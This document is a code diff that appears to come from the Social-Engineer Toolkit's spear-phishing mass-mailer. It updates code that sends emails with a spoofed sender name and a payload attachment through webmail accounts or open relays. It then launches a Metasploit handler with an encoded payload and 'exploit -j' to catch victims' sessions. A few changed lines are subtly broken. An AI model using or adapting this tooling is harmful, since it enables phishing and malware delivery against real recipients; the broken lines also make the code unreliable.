@@ -12,15 +12,21 @@ import pexpect
 import base64
 import thread
 
+from cStringIO import StringIO
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEBase import MIMEBase
 from email.MIMEText import MIMEText
+from email.header import Header
+from email.generator import Generator
+from email import Charset
 from email import Encoders
 # DEFINE SENDMAIL CONFIG
 sendmail=0
-sendmail_file=file("config/set_config","r").readlines()
+sendmail_file=file("/etc/setoolkit/set.config","r").readlines()
 
 from src.core.setcore import *
+
+Charset.add_charset('utf-8', Charset.BASE64, Charset.BASE64, 'utf-8')
 
 # Specify if its plain or html
 message_flag="plain"
@@ -50,7 +56,7 @@ for line in sendmail_file:
                 # Flip sendmail switch to get rid of some questions
                 sendmail=1
                 # just throw user and password to blank, needed for defining below
-                user=''
+                provideruser=''
                 pwd=''
 
     # Search for SMTP provider we will be using
@@ -70,7 +76,7 @@ for line in sendmail_file:
         if email_provider == "yahoo":
             if sendmail == 0:
                 smtp = ("smtp.mail.yahoo.com")
-                port = ("25")
+                port = ("465")
 
         # support smtp for hotmail
         if email_provider == "hotmail":
@@ -112,10 +118,16 @@ if not os.path.isfile(setdir + "/template.pdf"):
                         print "No previous payload created."
                         file_format=raw_input(setprompt(["1"], "Enter the file to use as an attachment"))
                         if not os.path.isfile("%s" % (file_format)):
-                            print_error("ERROR:FILE NOT FOUND. Try Again.")
-                            file_format=raw_input(setprompt(["1"], "Enter the file to use as an attachment"))
-                            print_error("ERROR:Sorry hoss, that was twice, check the filepath and try again. Exiting...")
-                            exit_set()
+                            while 1:
+                                print_error("ERROR:FILE NOT FOUND. Try Again.")
+                                file_format=raw_input(setprompt(["1"], "Enter the file to use as an attachment"))
+                                if os.path.isfile(file_format):
+                                    break
+
+# if not found exit out
+if not os.path.isfile(file_format):
+    exit_set()
+
 print """
    Right now the attachment will be imported with filename of 'template.whatever'
 
@@ -271,17 +283,18 @@ relay = raw_input(setprompt(["1"], ""))
 counter=0
 # Specify SMTP Option Here
 if relay == '1':
-    user = raw_input(setprompt(["1"], ("Your %s email address" % email_provider)))
-    from_address = raw_input(setprompt(["1"], "The FROM NAME user will see: "))
-    user1 = user
+    provideruser = raw_input(setprompt(["1"], ("Your %s email address" % email_provider)))
+    from_address = provideruser
+    from_displayname = raw_input(setprompt(["1"], "The FROM NAME user will see"))
     pwd = getpass.getpass("Email password: ")
 
 # Specify Open-Relay Option Here
 if relay == '2':
-    user1 = raw_input(setprompt(["1"], "From address (ex: moo@example.com)"))
-    from_address = raw_input(setprompt(["1"], "The FROM NAME user will see: "))
+    from_address = raw_input(setprompt(["1"], "From address (ex: moo@example.com)"))
+    from_displayname = raw_input(setprompt(["1"], "The FROM NAME user will see"))
     if sendmail==0:
-        user = raw_input(setprompt(["1"], "Username for open-relay [blank]"))
+        # Ask for a username and password if we aren't using sendmail
+        provideruser = raw_input(setprompt(["1"], "Username for open-relay [blank]"))
         pwd =  getpass.getpass("Password for open-relay [blank]: ")
 
     if sendmail==0:
@@ -302,14 +315,14 @@ else:
 # Define mail send here
 def mail(to, subject, text, attach, prioflag1, prioflag2):
     msg = MIMEMultipart()
-    msg['From'] = from_address
+    msg['From'] = str(Header(from_displayname, 'UTF-8').encode() + ' <' + from_address + '> ')
     msg['To'] = to
     msg['X-Priority'] = prioflag1
     msg['X-MSMail-Priority'] = prioflag2
-    msg['Subject'] = subject
+    msg['Subject'] = Header(subject, 'UTF-8').encode()
     # specify if its html or plain
     # body message here
-    body_type=MIMEText(text, "%s" % (message_flag))
+    body_type=MIMEText(text, "%s" % (message_flag), 'UTF-8')
     msg.attach(body_type)
     # define connection mimebase
     part = MIMEBase('application', 'octet-stream')
@@ -319,50 +332,55 @@ def mail(to, subject, text, attach, prioflag1, prioflag2):
     # add headers
     part.add_header('Content-Disposition','attachment; filename="%s"' % os.path.basename(attach))
     msg.attach(part)
+    
+    io = StringIO()
+    msggen = Generator(io, False)
+    msggen.flatten(msg)
+    
     # define connection to smtp server
     mailServer = smtplib.SMTP(smtp, int(port))
     mailServer.ehlo()
     # send ehlo to smtp server
     if sendmail == 0:
-        if email_provider == "gmail":
+        if email_provider == "gmail" or email_provider == "yahoo":
             mailServer.ehlo()
-            # start TLS for gmail sometimes needed
+            # start TLS needed for gmail and yahoo
             try:
                 mailServer.starttls()
             except: pass
             mailServer.ehlo()
     if counter == 0:
         try:
-            if email_provider == "gmail":
+            if email_provider == "gmail" or email_provider == "yahoo":
                 try:
                     mailServer.starttls()
                 except:
                     pass
                 mailServer.ehlo()
-                if len(user) > 0:
-                    mailServer.login(user, pwd)
-                mailServer.sendmail(user1, to, msg.as_string())
+                if len(provideruser) > 0:
+                    mailServer.login(provideruser, pwd)
+                mailServer.sendmail(from_address, to, io.getvalue())
         except Exception, e:
             print_error("Unable to deliver email. Printing exceptions message below, this is most likely due to an illegal attachment. If using GMAIL they inspect PDFs and is most likely getting caught.")
             raw_input("Press {return} to view error message.")
             print str(e)
             try:
-                mailServer.docmd("AUTH LOGIN", base64.b64encode(user))
+                mailServer.docmd("AUTH LOGIN", base64.b64encode(provideruser))
                 mailServer.docmd(base64.b64encode(pwd), "")
             except Exception,e:
                 print str(e)
                 try:
-                    mailServer.login(user, pwd)
-                    thread.start_new_thread(mailServer.sendmail,(user1, to, msg.as_string()))
+                    mailServer.login(provideremail, pwd)
+                    thread.start_new_thread(mailServer.sendmail(from_address, to, io.getvalue()))
                 except Exception, e:
                     return_continue()
 
-    if email_provider == "yahoo" or email_provider == "hotmail":
-        mailServer.login(user, pwd)
-        thread.start_new_thread(mailServer.sendmail,(user1, to, msg.as_string()))
+    if email_provider == "hotmail":
+        mailServer.login(provideruser, pwd)
+        thread.start_new_thread(mailServer.sendmail,(from_address, to, io.getvalue()))
 
     if sendmail == 1:
-        thread.start_new_thread(mailServer.sendmail,(user1, to, msg.as_string()))
+        thread.start_new_thread(mailServer.sendmail,(from_address, to, io.getvalue()))
 
 if option1 == '1':
     try:
@@ -392,7 +410,7 @@ if not os.path.isfile(setdir + "/template.zip"):
                 if not os.path.isfile(setdir + "/unc_config"):
                     print_error("Sorry, you did not generate your payload through SET, this option is not supported.")
         if os.path.isfile(setdir + "/unc_config"):
-            child=pexpect.spawn("ruby %s/msfconsole -L -n -r %s/unc_config" % (meta_path,setdir))
+            child=pexpect.spawn("%smsfconsole -r %s/unc_config" % (meta_path,setdir))
             try: child.interact()
             except Exception: child.close()
 
@@ -410,9 +428,9 @@ if not os.path.isfile(setdir + "/template.zip"):
             filewrite.write("set LPORT "+line[2]+"\n")
             filewrite.write("set ENCODING shikata_ga_nai\n")
             filewrite.write("set ExitOnSession false\n")
-            filewrite.write("exploit -j\n\n")
+            filewrite.write("exploit -j\r\n\r\n")
             filewrite.close()
-            child=pexpect.spawn("ruby %s/msfconsole -L -n -r %s/meta_config" % (meta_path,setdir))
+            child=pexpect.spawn("%smsfconsole -r %s/meta_config" % (meta_path,setdir))
             try:
                 child.interact()
             except Exception:
